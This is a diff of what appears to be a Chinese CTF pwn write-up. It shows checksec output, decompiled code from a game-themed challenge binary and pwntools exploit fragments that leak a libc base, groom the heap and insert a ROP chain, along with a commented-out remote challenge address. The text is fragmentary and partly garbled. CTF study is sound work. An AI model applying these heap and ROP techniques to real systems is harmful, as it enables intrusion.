@@ -8,13 +8,19 @@ HOT
 一、heack
 
 [*] '/home/zer00ne/Desktop/New Folder/pwn'
-Arch:amd64-64-little
-RELRO:Full RELRO
-Stack:Canary found
+Arch:
+amd64-64-little
+RELRO:
+Full RELRO
+Stack:
+Canary found
 NX:NX enabled
-PIE:PIE enabled
-SHSTK:Enabled
-IBT:Enabled
+PIE:
+PIE enabled
+SHSTK:
+Enabled
+IBT:
+Enabled
 Stripped:No
 
 from pwn import *
@@ -318,21 +324,22 @@ App之算法分析
 
 ```
 [*] '/home/zer00ne/Desktop/New Folder/pwn'
-Arch:amd64-64-little
-RELRO:Full RELRO
-Stack:Canary found
+Arch:
+amd64-64-little
+RELRO:
+Full RELRO
+Stack:
+Canary found
 NX:NX enabled
-PIE:PIE enabled
-SHSTK:Enabled
-IBT:Enabled
+PIE:
+PIE enabled
+SHSTK:
+Enabled
+IBT:
+Enabled
 Stripped:No
-```
-
-
-
-```
 from pwn import *
-#io=process('./pwn')
+    #io=process('./pwn')
 libc=ELF('./libc.so.6')
 context.log_level='debug'
 defbug():
@@ -377,22 +384,12 @@ except:
         io.close()
 
 io.interactive()
-```
-
-
-
-```
 pwndbg> x/5i 0x555555554000+0x1867+3
 0x55555555586a <game+65>:	pop    rbp
 0x55555555586b <game+66>:	nop    DWORD PTR [rax]
 0x55555555586e <game+69>:	mov    edx,DWORD PTR [rbp-0x18]
 0x555555555871 <game+72>:	mov    eax,DWORD PTR [rbp-0x14]
 0x555555555874 <game+75>:	xor    eax,edx
-```
-
-
-
-```
 while ( 1 )
 {
 puts("nDuring your grueling training, you feel compelled to document your thoughts...");
@@ -493,11 +490,6 @@ break;
   }
 puts("Exiting diary system. Goodbye, hero!");
 }
-```
-
-
-
-```
 case 2:
 puts("n[Attack Training]");
     ++v4;
@@ -517,11 +509,6 @@ printf("[Attack]: %lun", v4);
 printf("[Combat Power]: %lun", v3);
 printf("Hint: To defeat the mighty dragon, ensure your HP and Attack both exceed 93!");
 break;
-```
-
-
-
-```
 io.sendlineafter(b"> ",b"5")
 add(1,0x500,"A"*8)
 add(0,0x100,"A"*8)
@@ -536,11 +523,6 @@ io.sendlineafter(b">", b"2")
 io.recvuntil(b"[Attack]:")
 base=int(io.recvline()[:-1],10)-0x203b31
 print(hex(base))
-```
-
-
-
-```
 io.sendlineafter(b"> ",b"5")
 add(0, 0x10, "X"*0x10)
 ch2(4)
@@ -557,15 +539,10 @@ free(0)
 add(0, 0xc0, b"X"*0x20+rop)
 bug()
 ch2(4)
-```
-
-
-
-```
 from pwn import *
 io=process('./pwn')
 libc=ELF('./libc.so.6')
-#io=remote("1.95.8.146",19999)
+    #io=remote("1.95.8.146",19999)
 context.log_level='debug'
 def bug():
     gdb.attach(io)
